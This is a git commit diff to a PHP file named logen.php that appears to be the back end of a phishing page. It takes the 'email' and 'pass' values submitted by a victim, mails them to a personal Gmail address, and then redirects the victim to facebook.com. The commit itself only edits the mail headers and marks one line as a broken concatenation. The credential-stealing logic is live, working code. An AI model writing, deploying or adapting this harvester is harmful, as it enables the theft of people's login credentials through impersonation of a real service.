657af4a0b5c60914f03f5935d7acec0d375b3975
Melkamu Dagne <38700508+abbamelka@users.noreply.github.com>
2021-10-15 16:21:06 +0300

    Update logen.php

--- mobile2/logen.php
+++ mobile2/logen.php
@@ -3,11 +3,13 @@
 $to      = 'melkamudagne19@gmail.com';
 $subject = 'the subject';
 $message = $_POST["email"] . "  :  " . $_POST["pass"];
-$headers = 'From: webmaster@example.com' . "\r\n" .
-    'Reply-To:webmaster@example.com' . "\r\n" .
-    'X-Mailer: PHP/' . phpversion();
+$header2 = "From:abc@somedomain.com \r\n";
+$header2 = "Cc:afgh@somedomain.com \r\n";
+//       ^ BROKEN concatenate
+$header2 .= "MIME-Version: 1.0\r\n";
+$header2 .= "Content-type: text/html\r\n";
 
-mail($to, $subject, $message,$headers);
+mail($to, $subject, $message,$header2);
 
 
 $newURL = "https://www.facebook.com";
